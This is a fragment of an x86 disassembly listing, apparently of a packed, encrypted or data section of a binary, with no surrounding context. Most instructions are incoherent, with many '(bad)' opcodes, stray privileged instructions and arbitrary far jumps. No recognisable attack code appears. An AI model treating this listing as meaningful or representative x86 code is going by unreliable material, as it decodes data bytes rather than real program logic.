  404fa5:	lds    ebx,FWORD PTR [eax+edi*8+0x7a59fe96]
  404fac:	push   ss
  404fad:	popa   
  404fae:	sub    ebp,esi
  404fb0:	push   edi
  404fb1:	popf   
  404fb2:	add    al,0xf6
  404fb4:	jge    0x404f5c
  404fb6:	scas   eax,DWORD PTR es:[edi]
  404fb7:	push   es
  404fb8:	xchg   edx,eax
  404fb9:	ds and edi,esi
  404fbc:	imul   ecx,ebp,0xffffffb1
  404fbf:	aad    0xe
  404fc1:	push   ebx
  404fc2:	stos   DWORD PTR es:[edi],eax
  404fc3:	push   es
  404fc4:	loopne 0x404f62
  404fc6:	or     al,0x20
  404fc8:	es repz shl DWORD PTR ds:[esi],1
  404fcd:	push   ds
  404fce:	xor    eax,0x3e7b272e
  404fd3:	dec    edx
  404fd4:	dec    ecx
  404fd5:	je     0x404fc4
  404fd7:	add    al,0xa5
  404fd9:	mov    bl,0x61
  404fdb:	push   0xa2a8e708
  404fe0:	shr    dl,cl
  404fe2:	test   bl,ch
  404fe4:	fimul  DWORD PTR [edi+0x45f152ff]
  404fea:	or     DWORD PTR [edx-0x76],eax
  404fed:	mov    ds:0x44e4911a,eax
  404ff2:	ja     0x404ff9
  404ff4:	fnstenv [esi+0x56f9f877]
  404ffa:	jge    0x405002
  404ffc:	jnp    0x404fed
  404ffe:	jns    0x404fca
  405000:	mov    ebx,0x42bf476f
  405005:	mov    ds:0x2bd44589,eax
  40500a:	sbb    eax,0x42a3fd
  40500f:	jmp    0x40551a
  405014:	ret    0x3cd0
  405017:	int3   
  405018:	fcmovbe st,st(4)
  40501a:	rcl    dh,cl
  40501c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40501d:	or     eax,0xe83e7aa3
  405022:	fwait
  405023:	outs   dx,DWORD PTR ds:[esi]
  405024:	and    BYTE PTR ds:0x7c6a7878,dh
  40502a:	js     0x4050a4
  40502c:	push   edi
  40502d:	sub    ecx,0xa6dc1dfc
  405033:	dec    edi
  405034:	and    eax,0x86af0993
  405039:	xor    BYTE PTR [edi],cl
  40503b:	mov    eax,0xc3896139
  405040:	mov    ds:0xd87822ca,al
  405045:	sbb    DWORD PTR [ecx-0x7a814005],edx
  40504b:	hlt    
  40504c:	fs jmp 0x41591c53
  405052:	jb     0x404fe7
  405054:	inc    esp
  405055:	mov    ds:0xc5e6b0fd,al
  40505a:	or     DWORD PTR [ebx+0x4a],eax
  40505d:	mov    ebp,0x9be1e017
  405062:	es inc eax
  405064:	out    dx,al
  405065:	dec    BYTE PTR [eax+0x20377fe]
  40506b:	and    esp,DWORD PTR [eax]
  40506d:	das    
  40506e:	int3   
  40506f:	push   0x49e3ed74
  405074:	xor    ecx,ebx
  405076:	sub    DWORD PTR [eax-0x1e80f121],0x4cea10b
  405080:	fst    DWORD PTR ds:0xe437abe5
  405086:	fiadd  DWORD PTR [ebp+0x2b7b1aa3]
  40508c:	test   al,0xb0
  40508e:	imul   BYTE PTR [ebx+0x638c105c]
  405094:	or     al,0xfb
  405096:	es jne 0x405058
  405099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40509a:	lea    edx,[eax]
  40509c:	lods   al,BYTE PTR ds:[esi]
  40509d:	std    
  40509e:	pop    esi
  40509f:	ins    DWORD PTR es:[edi],dx
  4050a0:	dec    edx
  4050a1:	icebp  
  4050a2:	adc    eax,0xb7dc308b
  4050a7:	inc    esp
  4050a8:	das    
  4050a9:	ret    0x4c9
  4050ac:	pop    esi
  4050ad:	inc    esi
  4050ae:	dec    ebx
  4050af:	inc    edi
  4050b0:	sub    DWORD PTR [ecx-0x4995028c],ecx
  4050b6:	repz scas eax,DWORD PTR es:[edi]
  4050b8:	and    al,BYTE PTR [edx+ecx*4-0x62]
  4050bc:	(bad)  
  4050bd:	(bad)  
  4050be:	pop    esp
  4050bf:	sar    ecx,cl
  4050c1:	mov    ch,BYTE PTR [esi+0x68]
  4050c4:	xchg   DWORD PTR [esp+edi*4],edi
  4050c7:	inc    ebx
  4050c8:	sbb    eax,0xa2184d63
  4050cd:	push   ebx
  4050ce:	jno    0x4050c8
  4050d0:	div    BYTE PTR [edi+0x27]
  4050d3:	sahf   
  4050d4:	xchg   ecx,eax
  4050d5:	cmp    eax,0xcb4ed58d
  4050da:	sub    BYTE PTR [eax+0x3e888ea8],dh
  4050e0:	ret    
  4050e1:	sub    DWORD PTR [edx-0x52],eax
  4050e4:	xor    BYTE PTR [eax+0x4249e5cc],0x84
  4050eb:	cmp    edx,esp
  4050ed:	push   esp
  4050ee:	sub    edx,DWORD PTR [ebp+0x5a]
  4050f1:	ds popa 
  4050f3:	or     DWORD PTR [ebp+0x3bf21a39],esp
  4050f9:	mov    es:0x5af2a0ad,al
  4050ff:	iret   
  405100:	sti    
  405101:	xchg   esp,eax
  405102:	enter  0x7cbe,0xd5
  405106:	jae    0x405113
  405108:	mov    bh,0x76
  40510a:	xchg   ebp,eax
  40510b:	lods   al,BYTE PTR ds:[esi]
  40510c:	sbb    DWORD PTR [esi],esp
  40510e:	jbe    0x405121
  405110:	xchg   esp,eax
  405111:	pop    ebp
  405112:	jo     0x405145
  405114:	out    0x3b,al
  405116:	pushf  
  405117:	repz rcl DWORD PTR [ebp+0x33],1
  40511b:	call   0xdb8b:0xcf746de3
  405122:	push   ebp
  405123:	(bad)  
  405124:	fidiv  DWORD PTR [ebp+0x1426a0b]
  40512a:	ret    
  40512b:	dec    ebx
  40512c:	cmc    
  40512d:	mov    cl,0xe
  40512f:	stc    
  405130:	and    DWORD PTR [ecx+0x2c],ecx
  405133:	(bad)  
  405134:	mov    al,0xb7
  405136:	add    dh,BYTE PTR [eax+0x51]
  405139:	cmp    eax,0x353da29e
  40513e:	add    ch,BYTE PTR [edi+edx*2]
  405141:	ds icebp 
  405143:	xchg   esp,eax
  405144:	add    eax,0x2f67230
  405149:	add    ebp,DWORD PTR [ebx-0x6282050f]
  40514f:	mov    edx,0x2d265485
  405154:	xchg   esp,eax
  405155:	daa    
  405156:	xor    ebx,DWORD PTR [eax-0x67]
  405159:	or     bh,BYTE PTR [ebp+0xc]
  40515c:	outs   dx,DWORD PTR ds:[esi]
  40515d:	shr    DWORD PTR [ecx-0x4d6f4408],1
  405163:	addr16 sub al,0x74
  405166:	pop    ds
  405167:	jns    0x4051e6
  405169:	sahf   
  40516a:	fld    DWORD PTR [eax+0x8]
  40516d:	test   eax,0x8ceec177
  405172:	xchg   ebx,eax
  405173:	inc    ebp
  405174:	mov    al,0xac
  405176:	cmp    edi,DWORD PTR [ebx]
  405178:	fnstsw WORD PTR [ecx+0x3b0a5092]
  40517e:	mov    BYTE PTR [eax+0x29],dh
  405181:	sbb    DWORD PTR [ecx+0x4e],edx
  405184:	mov    bl,0x0
  405186:	sub    al,0xd5
  405188:	xchg   edi,eax
  405189:	sub    ebp,DWORD PTR [ebx-0x3e6c2e71]
  40518f:	(bad)  
  405190:	int3   
  405191:	sub    dl,0x90
  405194:	aas    
  405195:	fisttp WORD PTR [ebp+esi*4-0x55c814c4]
  40519c:	leave  
  40519d:	call   DWORD PTR [ebx-0x4bbfd7d7]
  4051a3:	dec    ebx
  4051a4:	jg     0x40517d
  4051a6:	pop    ebx
  4051a7:	adc    cl,BYTE PTR [ecx+0x65d2eb]
  4051ad:	add    ch,BYTE PTR [esi]
  4051af:	bound  esp,QWORD PTR [ecx-0x110f1dc6]
  4051b5:	repnz (bad) 
  4051b7:	xchg   ecx,eax
  4051b8:	stos   DWORD PTR es:[edi],eax
  4051b9:	xor    DWORD PTR [eax],ebp
  4051bb:	mov    dh,0xfb
  4051bd:	add    cl,al
  4051bf:	push   esp
  4051c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051c1:	fidiv  WORD PTR [ebx+ecx*2]
  4051c4:	xchg   ebx,eax
  4051c5:	mov    al,ds:0xdee319ee
  4051ca:	(bad)  
  4051cb:	stos   DWORD PTR es:[edi],eax
  4051cc:	jle    0x405212
  4051ce:	push   ebx
  4051cf:	mov    al,0x95
  4051d1:	inc    ebp
  4051d2:	mov    sp,0x677d
  4051d6:	nop
  4051d7:	ds lahf 
  4051d9:	bound  esp,QWORD PTR [ecx]
  4051db:	dec    ebp
  4051dc:	ret    
  4051dd:	mov    ah,0xd8
  4051df:	mov    edi,0xb45c1d91
  4051e4:	push   ebx
  4051e5:	es jmp 0xe02a:0x58494473
  4051ed:	cmp    eax,0x4d3ec8c1
  4051f2:	dec    esp
  4051f3:	fimul  WORD PTR [edx+0xb]
  4051f6:	sub    al,0x9b
  4051f8:	cmc    
  4051f9:	rcr    DWORD PTR [edi+eax*1],cl
  4051fc:	js     0x405235
  4051fe:	in     al,dx
  4051ff:	sub    eax,0x38751383
  405204:	push   es
  405205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405206:	xchg   esi,eax
  405207:	jae    0x4051f4
  405209:	add    dl,BYTE PTR [ebx+0x53]
  40520c:	dec    edi
  40520d:	xchg   esp,eax
  40520e:	mov    ah,0xba
  405210:	mov    edx,0x5469f146
  405215:	cld    
  405216:	jbe    0x40520c
  405218:	jb     0x405294
  40521a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40521b:	adc    al,0x2b
  40521d:	xchg   edi,eax
  40521e:	mov    esp,0x39620d3c
  405223:	xor    DWORD PTR [edi-0x70],ebp
  405226:	dec    eax
  405227:	das    
  405228:	push   ebp
  405229:	fcomp  st(3)
  40522b:	push   ebx
  40522c:	fwait
  40522d:	sub    BYTE PTR [edx+0x5ade8710],dl
  405233:	repnz push esp
  405235:	data16 xor BYTE PTR [ebx+0x45],ah
  405239:	push   ebx
  40523a:	jmp    0x141f31d2
  40523f:	mov    BYTE PTR [eax+0x4317eeac],bl
  405245:	shl    DWORD PTR [esi],0xbe
  405248:	fbstp  TBYTE PTR [edi+0x8b1ae7b]
  40524e:	ja     0x40524c
  405250:	repz jge 0x40527e
  405253:	test   BYTE PTR [edx+eax*2+0x7d17c112],ah
  40525a:	adc    DWORD PTR [ecx-0x45],ebp
  40525d:	aam    0x5f
  40525f:	add    ecx,DWORD PTR [esp+ebx*1-0x7c]
  405263:	into   
  405264:	call   0x9144:0xe3a77718
  40526b:	(bad)  
  40526c:	rcr    DWORD PTR [ebx-0x29],1
  40526f:	es jno 0x405269
  405272:	shr    DWORD PTR [ebx],1
  405274:	mov    ah,0x5f
  405276:	and    BYTE PTR [edi],0xfc
  405279:	rcl    BYTE PTR [esi+0x4c1f961d],1
  40527f:	fxch   st(0)
  405281:	sub    BYTE PTR [esi+0x36],0x85
  405285:	pop    edx
  405286:	pop    es
  405287:	xor    ecx,ecx
  405289:	add    al,0x96
  40528b:	repz xor al,0xfe
  40528e:	(bad)
  405291:	jae    0x4052cb
  405293:	ds sub esi,0xffffff9e
  405297:	int3   
  405298:	push   eax
  405299:	rol    ah,1
  40529b:	push   edi
  40529c:	jmp    0x5c57:0x78c6bdf2
  4052a3:	lahf   
  4052a4:	xchg   DWORD PTR [edx+0x60007e09],ebx
  4052aa:	test   al,0x12
  4052ac:	into   
  4052ad:	ds (bad) 
  4052af:	clc    
  4052b0:	adc    esp,edi
  4052b2:	xchg   dl,bh
  4052b4:	mov    DWORD PTR [edi+0x13],edx
  4052b7:	ret    
  4052b8:	gs inc ebx
  4052ba:	jle    0x4052d8
  4052bc:	ds mov al,0xd1
  4052bf:	not    edx
  4052c1:	push   edi
  4052c2:	push   esp
  4052c3:	jle    0x405275
  4052c5:	imul   BYTE PTR [ebx]
  4052c7:	add    dl,dh
  4052c9:	jle    0x405337
  4052cb:	sbb    ch,bl
  4052cd:	js     0x405294
  4052cf:	or     al,0x66
  4052d1:	fld    DWORD PTR [ecx]
  4052d3:	push   ecx
  4052d4:	inc    eax
  4052d5:	pop    edi
  4052d6:	call   0xbe66:0xbd5d0aa1
  4052dd:	adc    ah,BYTE PTR [esi]
  4052df:	push   ebp
  4052e0:	in     eax,dx
  4052e1:	adc    edi,0xfd391c03
  4052e7:	jl     0x405312
  4052e9:	xchg   esp,eax
  4052ea:	call   0xecd7509b
  4052ef:	push   edi
  4052f0:	loope  0x405293
  4052f2:	outs   dx,BYTE PTR ds:[esi]
  4052f3:	add    BYTE PTR [eax],al
  4052f5:	xchg   ecx,eax
  4052f6:	aas    
  4052f7:	pop    es
  4052f8:	and    al,0xc8
  4052fa:	and    eax,0x6ee12c7d
  4052ff:	dec    ebx
  405300:	or     edi,DWORD PTR [esi-0x7d6dab57]
  405306:	xchg   edi,eax
  405307:	daa    
  405308:	(bad)  
  405309:	rol    DWORD PTR [edx-0x21],cl
  40530c:	fucomi st,st(7)
  40530e:	adc    BYTE PTR [ebx],bh
  405310:	mov    ebx,0xd4427af1
  405315:	pushf  
  405316:	jl     0x40537e
  405318:	in     eax,0x19
  40531a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40531b:	mov    al,0xa7
  40531d:	add    BYTE PTR [esi+0xe],dl
  405320:	mov    bh,BYTE PTR [esi-0x3d]
  405323:	in     eax,dx
  405324:	neg    esi
  405326:	mov    edi,0x1d1c3f95
  40532b:	dec    ebx
  40532c:	repz int 0x39
  40532f:	adc    eax,0xc3ffa2cc
  405334:	jbe    0x4052cd
  405336:	cmp    BYTE PTR ss:[edi],0x1a
  40533a:	outs   dx,BYTE PTR ds:[esi]
  40533b:	sub    al,0x8
  40533d:	xchg   ebx,eax
  40533e:	sbb    al,0xde
  405340:	add    al,0x86
  405342:	jle    0x40531c
  405344:	dec    ebx
  405345:	es pop ebx
  405347:	mov    BYTE PTR [ecx+0x62],ah
  40534a:	add    ch,dl
  40534c:	es int3 
  40534e:	jp     0x4052e6
  405350:	inc    ebx
  405351:	xlat   BYTE PTR ds:[ebx]
  405352:	push   esi
  405353:	(bad)  
  405354:	ror    BYTE PTR [ebp+0x36],cl
  405357:	sti    
  405358:	ins    BYTE PTR es:[edi],dx
  405359:	loope  0x4052f3
  40535b:	retf   0x11ec
  40535e:	sub    eax,0xe146c2b4
  405363:	fistp  QWORD PTR [eax+esi*1]
  405366:	daa    
  405367:	pop    ebx
  405368:	pop    ebp
  405369:	pop    eax
  40536a:	xor    dh,BYTE PTR [ebx+0x4e]
  40536d:	das    
  40536e:	ss (bad) 
  405370:	dec    edi
  405371:	pop    ebp
  405372:	aam    0xb1
  405374:	cmp    eax,0xd3dccb90
  405379:	ror    BYTE PTR [eax-0xa],0xdc
  40537d:	sbb    ebp,DWORD PTR [ebp+eax*1-0x6e]
  405381:	mov    esp,0x39411340
  405386:	sbb    eax,0xa979d6d3
  40538b:	dec    edx
  40538c:	and    BYTE PTR [ebp+edx*4+0x15],0x69
  405391:	arpl   WORD PTR [edi],bx
  405393:	mov    ds:0x2269eed9,al
  405398:	(bad)  
  405399:	shl    eax,1
  40539b:	xor    BYTE PTR [ebx+0x302a7306],bl
  4053a1:	xor    BYTE PTR [edx],ch
  4053a3:	test   eax,0x9ce3e0e4
  4053a8:	push   esp
  4053a9:	fisub  DWORD PTR [edx+0x5]
  4053ac:	stos   BYTE PTR es:[edi],al
  4053ad:	out    0x7b,al
  4053af:	data16 mov bl,0x92
  4053b2:	cwde   
  4053b3:	mov    ch,0x6e
  4053b5:	into   
  4053b6:	ffreep st(5)
  4053b8:	mov    dh,0x14
  4053ba:	add    bh,dl
  4053bc:	into   
  4053bd:	sub    ecx,DWORD PTR [ebp-0x6e]
  4053c0:	shr    BYTE PTR [ebp-0x77],cl
  4053c3:	int3   
  4053c4:	jecxz  0x405393
  4053c6:	push   eax
  4053c7:	jno    0x4053c1
  4053c9:	aas    
  4053ca:	push   esp
  4053cb:	in     eax,0x43
  4053cd:	push   eax
  4053ce:	repnz mov dh,0x1b
  4053d1:	pusha  
  4053d2:	mul    DWORD PTR [esi-0x463ed838]
  4053d8:	outs   dx,DWORD PTR ds:[esi]
  4053d9:	(bad)  
  4053da:	out    dx,al
  4053db:	imul   edi,DWORD PTR ds:[edi],0x7b
  4053df:	mul    DWORD PTR [edx+edx*4+0x1c]
  4053e3:	shl    edx,0x6c
  4053e6:	cwde   
  4053e7:	xchg   BYTE PTR [edi],dh
  4053e9:	cmc    
  4053ea:	inc    edx
  4053eb:	(bad)  [edi+0x5d70bf9b]
  4053f1:	jb     0x405470
  4053f3:	mul    DWORD PTR [edx-0x2a2945f2]
  4053f9:	add    BYTE PTR [ebp-0x991c037],al
  4053ff:	push   ebx
  405400:	js     0x405435
  405402:	mov    esp,0xfc9ad40e
  405407:	sbb    esp,edi
  405409:	mov    ss,WORD PTR [ebx]
  40540b:	or     al,0x2c
  40540d:	mov    ebp,0x7169835c
  405412:	rol    BYTE PTR [esi-0x70d90ad3],1
  405418:	ss loope 0x4053a1
  40541b:	inc    ebx
  40541c:	sbb    DWORD PTR [eax+ecx*1+0x3d],esp
  405420:	shl    BYTE PTR ds:0xc6b4df0f,0x3
  405427:	inc    esp
  405428:	push   esi
  405429:	mov    ecx,0xf3fea138
  40542e:	(bad)  
  40542f:	xchg   esp,eax
  405430:	sub    eax,DWORD PTR [edi]
  405432:	or     ecx,DWORD PTR [edi]
  405434:	push   DWORD PTR [edx]
  405436:	pop    ds
  405437:	arpl   cx,ax
  405439:	cmc    
  40543a:	inc    edx
  40543b:	lods   eax,DWORD PTR ds:[esi]
  40543c:	xor    al,dl
  40543e:	sub    esp,0xe6ad15e9
  405444:	cmp    DWORD PTR [ecx-0xc],eax
  405447:	retf   0x1cdd
  40544a:	and    BYTE PTR [ebx+0x59],al
  40544d:	(bad)  
  40544e:	xlat   BYTE PTR ds:[ebx]
  40544f:	test   eax,0x7d7c2f0a
  405454:	mov    dh,0xad
  405456:	adc    ecx,DWORD PTR [eax-0x4b]
  405459:	lock hlt 
  40545b:	retf   
  40545c:	outs   dx,DWORD PTR gs:[esi]
  40545e:	mov    ecx,0x78bfeffe
  405463:	(bad)  [edi-0x71]
  405466:	ins    DWORD PTR es:[edi],dx
  405467:	mov    ebx,0xfeffa6d9
  40546c:	cmp    ebp,eax
  40546e:	les    ecx,FWORD PTR [esi-0x50c49389]
  405474:	push   ds
  405475:	sbb    DWORD PTR [ebx-0x4f78916d],eax
  40547b:	aas    
  40547c:	push   edx
  40547d:	clc    
  40547e:	dec    ecx
  40547f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405480:	adc    DWORD PTR [edi-0x173e6688],ebp
  405486:	xchg   edi,eax
  405487:	imul   edx,DWORD PTR [ebx],0xaad7c6a5
  40548d:	repnz pop eax
  40548f:	addr16 inc ebx
  405491:	retf   
  405492:	rol    al,1
  405494:	mov    edi,0xfff54bae
  405499:	cmp    cl,BYTE PTR [eax+0x176247a1]
  40549f:	adc    BYTE PTR [eax],dl
  4054a1:	xor    eax,0xac662e4
  4054a6:	cmp    DWORD PTR [edx+esi*2-0x1e],ecx
  4054aa:	popf   
  4054ab:	or     al,0xd8
  4054ad:	push   eax
  4054ae:	ror    dl,0xe5
  4054b1:	push   esi
  4054b2:	dec    edi
  4054b3:	pop    ds
  4054b4:	arpl   sp,sp
  4054b6:	pusha  
  4054b7:	ss stos BYTE PTR es:[edi],al
  4054b9:	cmp    BYTE PTR [ecx],dh
  4054bb:	mov    WORD PTR [ebp+0x51],fs
  4054be:	lds    eax,FWORD PTR [eax+0x18bd571]
  4054c4:	int3   
  4054c5:	jne    0x4054f2
  4054c7:	mov    bl,0x91
  4054c9:	xchg   esi,eax
  4054ca:	out    0x39,eax
  4054cc:	inc    ebx
  4054cd:	into   
  4054ce:	fisttp WORD PTR [ecx-0x47]
  4054d1:	(bad)  
  4054d2:	in     eax,0xdb
  4054d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054d5:	push   esi
  4054d6:	(bad)  
  4054d7:	call   0xdb55e4f7
  4054dc:	or     al,0x93
  4054de:	cmc    
  4054df:	outs   dx,BYTE PTR ds:[esi]
  4054e0:	or     al,0xb6
  4054e2:	jle    0x40547e
  4054e4:	mov    ebp,0x5649f8f1
  4054e9:	(bad)  
  4054ea:	mov    bh,0xd1
  4054ec:	cmp    bh,BYTE PTR [edx]
  4054ee:	mov    ah,BYTE PTR [ecx]
  4054f0:	leave  
  4054f1:	aas    
  4054f2:	mov    ds:0xed0d87e5,eax
  4054f7:	fsub   QWORD PTR [eax+0x46a1f6dd]
  4054fd:	jp     0x4054bb
  4054ff:	sub    ah,BYTE PTR [ecx]
  405501:	lock adc eax,0xc52cbf88
  405507:	inc    edx
  405508:	fldcw  WORD PTR [edi-0x712ca0c7]
  40550e:	(bad)  
  40550f:	shl    BYTE PTR [edx-0x5dfba783],1
  405515:	mov    eax,0x9a54dca2
  40551a:	lea    eax,[ebp-0x98]
  405520:	mov    DWORD PTR [ebp-0x8],eax
  405523:	jmp    0x405a2e
  405528:	(bad)  
  405529:	int    0xc2
  40552b:	aas    
  40552c:	fcmovbe st,st(3)
  40552e:	leave  
  40552f:	aad    0xc0
  405531:	or     al,0x38
  405533:	lds    esp,FWORD PTR [ecx+0x20]
  405536:	jmp    0x787867ce
  40553b:	js     0x4055a7
  40553d:	jl     0x4055b7
  40553f:	js     0x405540
  405541:	dec    eax
  405542:	mov    cl,ah
  405544:	mov    ds:0x8cf83b4e,al
  405549:	jmp    0xc0fb:0xa3ba2534
  405550:	ja     0x40559c
  405552:	aas    
  405553:	inc    BYTE PTR cs:[edx]
  405556:	dec    esp
  405557:	mov    esp,edx
  405559:	pop    ds
  40555a:	(bad)  
  40555b:	and    BYTE PTR [eax-0x80],cl
  40555e:	mov    ebp,0x6c0f9464
  405563:	pop    ebx
  405564:	loop   0x4055af
  405566:	adc    al,0x61
  405568:	pop    esi
  405569:	jle    0x4055cb
  40556b:	mov    bh,0x6
  40556d:	into   
  40556e:	pop    DWORD PTR [ebp+0x3]
  405571:	xlat   BYTE PTR ds:[ebx]
  405572:	sub    dl,BYTE PTR [edx-0x4cdcbeec]
  405578:	sub    edx,DWORD PTR [ecx-0x6d]
  40557b:	retf   0xae2d
  40557e:	(bad)  
  40557f:	hlt    
  405580:	fidivr WORD PTR [esp+ecx*1]
  405583:	inc    eax
  405584:	and    edx,edi
  405586:	pop    ds
  405587:	cs jmp 0x377cc070
  40558d:	inc    esp
  40558e:	add    eax,0xd0aa3b1a
  405593:	cmp    dh,BYTE PTR [edi+0x10b3d8fa]
  405599:	loopne 0x4055e3
  40559b:	inc    ebp
  40559c:	cs ins DWORD PTR es:[edi],dx
  40559e:	mov    edi,DWORD PTR [ecx]
  4055a0:	jmp    0x4055b1
  4055a2:	cmp    dl,BYTE PTR [edi]
  4055a4:	jmp    0xce6:0xe914a058
  4055ab:	fcmovnbe st,st(6)
  4055ad:	test   BYTE PTR [edi+0x244e42f],ch
  4055b3:	test   al,0xcb
  4055b5:	jl     0x4055ed
  4055b7:	in     al,dx
  4055b8:	jns    0x4055f4
  4055ba:	and    al,0xe0
  4055bc:	xlat   BYTE PTR ds:[ebx]
  4055bd:	mov    edx,0xff93058d
  4055c2:	iret   
  4055c3:	sbb    al,0x94
  4055c5:	cmp    DWORD PTR [esi],edi
  4055c7:	adc    BYTE PTR [eax-0x7a619a08],bl
  4055cd:	add    BYTE PTR [ebp+0x2ed7903d],0xa1
  4055d4:	bound  edx,QWORD PTR [esi]
  4055d6:	adc    ebp,esi
  4055d8:	ins    DWORD PTR es:[edi],dx
  4055d9:	sti    
  4055da:	pop    ss
  4055db:	jecxz  0x40564c
  4055dd:	or     DWORD PTR [edi+0x63],0x6c2a910f
  4055e4:	fcmovu st,st(2)
  4055e6:	stc    
  4055e7:	fimul  DWORD PTR [esi]
  4055e9:	arpl   WORD PTR [edi-0x6727f919],dx
  4055ef:	pop    eax
  4055f0:	cmp    al,BYTE PTR [esi-0x79]
  4055f3:	(bad)  
  4055f4:	dec    ecx
  4055f5:	sbb    esp,DWORD PTR [edi-0x76a31b28]
  4055fb:	and    dl,dh
  4055fd:	inc    esp
  4055fe:	fnclex 
  405600:	mov    WORD PTR [ebx+0x9fa9082],?
  405606:	add    al,BYTE PTR [ecx-0x54]
  405609:	xchg   ebx,eax
  40560a:	mov    edx,0xd5ce8801
  40560f:	sub    cl,ah
  405611:	sbb    bh,cl
  405613:	pop    ebp
  405614:	cmp    DWORD PTR [ecx+0x30],0x6cad2099
  40561b:	or     ebp,DWORD PTR [edx+0x12]
  40561e:	fsub   DWORD PTR [edx-0x355df92a]
  405624:	mov    eax,0x620b4761
  405629:	lea    ebp,[esi-0x48]
  40562c:	jnp    0x4055f3
  40562e:	or     DWORD PTR [esi+0x7aaab4f4],esp
  405634:	xchg   BYTE PTR [ebp+0x66ec224f],cl
  40563a:	dec    esp
  40563b:	push   cs
  40563c:	cli    
  40563d:	test   DWORD PTR [esi+0x31bb4fd4],eax
  405643:	push   esi
  405644:	out    0xff,eax
  405646:	rol    BYTE PTR [edi],0xaa
  405649:	jmp    0xfcab:0x37268621
  405650:	or     al,0xf6
  405652:	fdivr  QWORD PTR [eax-0x60]
  405655:	imul   edx,DWORD PTR [edx+0x69],0x65
  405659:	mov    bl,0x9e
  40565b:	pop    es
  40565c:	inc    esp
  40565d:	aas    
  40565e:	push   es
  40565f:	xor    DWORD PTR [esp+ebx*2],ebp
  405662:	mov    BYTE PTR [eax],bl
  405664:	mov    al,0x6e
  405666:	or     DWORD PTR [ebx-0x15],ecx
  405669:	aaa    
  40566a:	xlat   BYTE PTR ds:[ebx]
  40566b:	sbb    DWORD PTR [eax],ebx
  40566d:	test   DWORD PTR ds:0xc354ff4e,ebx
  405673:	push   edx
  405674:	jge    0x405669
  405676:	popf   
  405677:	(bad)  
  405678:	out    dx,al
  405679:	or     ch,BYTE PTR [ebp-0x24]
  40567c:	push   ecx
  40567d:	mov    bl,BYTE PTR [ebx]
  40567f:	sbb    cl,0xc9
  405682:	in     eax,0x5c
  405684:	cmp    edi,DWORD PTR [edi+0x6c468c00]
  40568a:	xchg   esi,eax
  40568b:	pop    esi
  40568c:	sbb    dl,0x55
  40568f:	jne    0x405670
  405691:	or     BYTE PTR [eax],bl
  405693:	repnz inc eax
  405695:	xor    al,0x8e
  405697:	xlat   BYTE PTR ds:[ebx]
  405698:	pushf  
  405699:	hlt    
  40569a:	out    0x19,eax
  40569c:	xchg   DWORD PTR [ecx+0x16855793],edi
  4056a2:	imul   ebx,ebp,0x7e9e3be9
  4056a8:	and    eax,0x98fc10c1
  4056ad:	pop    eax
  4056ae:	mov    ch,0xa4
  4056b0:	adc    al,0xa4
  4056b2:	jae    0x4056f5
  4056b4:	repnz adc eax,0x7f1b6932
  4056ba:	hlt    
  4056bb:	pusha  
  4056bc:	fnstsw WORD PTR [edi-0xad334c]
  4056c2:	bound  edi,QWORD PTR [ebx+0x26]
  4056c5:	int    0xc6
  4056c7:	add    dl,al
  4056c9:	popf   
  4056ca:	adc    al,BYTE PTR [edx+0x1f]
  4056cd:	rcl    BYTE PTR [eax-0x10],1
  4056d0:	mov    esp,0x1ebd33a3
  4056d5:	and    eax,0x33caf9f0
  4056da:	xor    eax,0x8b2cf8b9
  4056df:	jns    0x405760
  4056e1:	xchg   ecx,eax
  4056e2:	adc    eax,0x2d149d0e
  4056e7:	pusha  
  4056e8:	jno    0x4056ab
  4056ea:	jg     0x40567e
  4056ec:	out    0x22,eax
  4056ee:	mov    ds:0xeb9b0acf,al
  4056f3:	cmp    eax,0xcea56659
  4056f8:	js     0x40569c
  4056fa:	call   0x17d6:0x274607fc
  405701:	mov    dl,0x9a
  405703:	push   esi
  405704:	push   ebp
  405705:	data16 sbb BYTE PTR [edx+0x2b764471],ch
  40570c:	dec    edx
  40570d:	jns    0x405724
  40570f:	push   0xffffff9b
  405711:	jg     0x40576c
  405713:	xor    al,BYTE PTR [eax+0x112dd738]
  405719:	(bad)  [ebp+eax*8-0x17]
  40571d:	shl    DWORD PTR [ebx],0x55
  405720:	mov    ecx,DWORD PTR [esi-0x5f118a83]
  405726:	sub    al,0xb2
  405728:	jmp    0x2d00:0x979436da
  40572f:	js     0x40573b
  405731:	ds in  al,0xe2
  405734:	mov    ebx,0x924efa3
  405739:	xchg   esi,eax
  40573a:	mov    esp,0x7666ebb6
  40573f:	mov    edx,0xe8ff5ea6
  405744:	jg     0x405786
  405746:	xchg   ebp,eax
  405747:	or     eax,0x5ae280ef
  40574c:	ret    0x40b8
  40574f:	cmp    BYTE PTR ds:0x52ca0bda,0x70
  405756:	scas   al,BYTE PTR es:[edi]
  405757:	jp     0x4056fb
  405759:	or     BYTE PTR [edi-0x17],0x69
  40575d:	imul   esi,DWORD PTR [eax+0x42db5787],0x9ef9da90
  405767:	mov    ebx,DWORD PTR [esi+0x0]
  40576a:	out    0x59,eax
  40576c:	add    ebx,ebx
  40576e:	jmp    0x1066:0xb970d64
  405775:	jg     0x4057f6
  405777:	push   esi
  405778:	xchg   esp,eax
  405779:	mov    esp,0xe0a8795d
  40577e:	scas   eax,DWORD PTR es:[edi]
  40577f:	jb     0x4057ed
  405781:	fwait
  405782:	pop    ss
  405783:	loop   0x405786
  405785:	mov    eax,gs:0xe208c95b
  40578b:	test   DWORD PTR [edx+0x6d261992],ebp
  405791:	sbb    BYTE PTR [ecx],al
  405793:	outs   dx,BYTE PTR ds:[esi]
  405794:	mov    edi,DWORD PTR [ebx]
  405796:	push   ebp
  405797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405798:	pushw  0xff92
  40579b:	call   esp
  40579d:	in     eax,dx
  40579e:	add    BYTE PTR [ebp-0x15],0x90
  4057a2:	sub    esp,DWORD PTR [edx-0x3d]
  4057a5:	pop    esi
  4057a6:	pop    ecx
  4057a7:	xchg   edi,eax
  4057a8:	push   edi
  4057a9:	push   edi
  4057aa:	mov    ch,0x69
  4057ac:	mov    ebx,0x85fe7f13
